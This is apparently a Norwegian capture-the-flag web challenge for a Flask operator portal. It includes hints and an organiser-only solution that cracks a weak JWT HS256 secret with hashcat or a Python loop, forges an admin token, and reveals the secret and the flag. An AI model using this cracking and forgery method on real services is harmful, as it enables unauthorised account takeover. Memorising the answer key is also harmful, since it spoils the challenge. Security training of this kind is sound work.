# Operatørportalen

**Kategori:** Web
**Poeng:** 350
**Type:** Container (Flask-webapplikasjon)
**Vanskelighetsgrad:** Medium
**Container:** 5 av 10

---

## Scenario

Nordverks interne operatørportal bruker JWT (JSON Web Tokens)
for autentisering. Du har fått gjestekonto-tilgang for demonstrasjon,
men admin-panelet er kun tilgjengelig for privilegerte brukere.

Finn en måte å oppgradere tilgangen din.

---

## Tilkobling

```
http://<IP>:8080
```

Gjestekonto: `guest` / `guest`

---

## Vedlegg

- [`wordlist.txt`](wordlist.txt), Ordliste med OT-relevante passord

---

## Flaggformat

```
CTF{...}
```

---

## Hints

| Kostnad | Hint |
|---------|------|
| 30 poeng | Se på cookien du får etter innlogging. Hva slags format er det? |
| 55 poeng | JWT består av tre deler. Payload-delen er lesbar når den dekodes. |
| 90 poeng | HMAC-signaturen bruker et svakt secret. Kan det finnes med ordlisten? |
| 115 poeng | Når signeringshemmeligheten er kjent, kan tokenet signeres på nytt med en annen rolle. |

---

## Løsningsvei (kun for arrangør)

### Steg 1 — Logg inn og inspiser JWT

Logg inn med `guest` / `guest`. Inspiser `session_token`-cookien i nettleseren
eller via curl. Dekod payloaden:

```json
{"sub": "guest", "role": "viewer", "iss": "nordverk-portal"}
```

### Steg 2 — Crack HMAC-secret

JWT bruker HS256 med et svakt secret. Bruk ordlisten eller `rockyou.txt`:

```bash
# Med hashcat:
hashcat -m 16500 token.txt wordlist.txt

# Eller med Python:
import jwt
for word in open("wordlist.txt"):
    try:
        jwt.decode(token, word.strip(), algorithms=["HS256"])
        print(f"Secret: {word.strip()}")
        break
    except: pass
```

**Secret:** `platform`

### Steg 3 — Forge admin-token

```python
import jwt
token = jwt.encode(
    {"sub": "admin", "role": "admin", "iss": "nordverk-portal"},
    "platform",
    algorithm="HS256"
)
```

### Steg 4 — Hent flagget

Sett den forged tokenen som `session_token`-cookie og besøk `/admin`.

**Flagg:** `CTF{jwt_w3ak_s3cr3t_f0rg3d}`
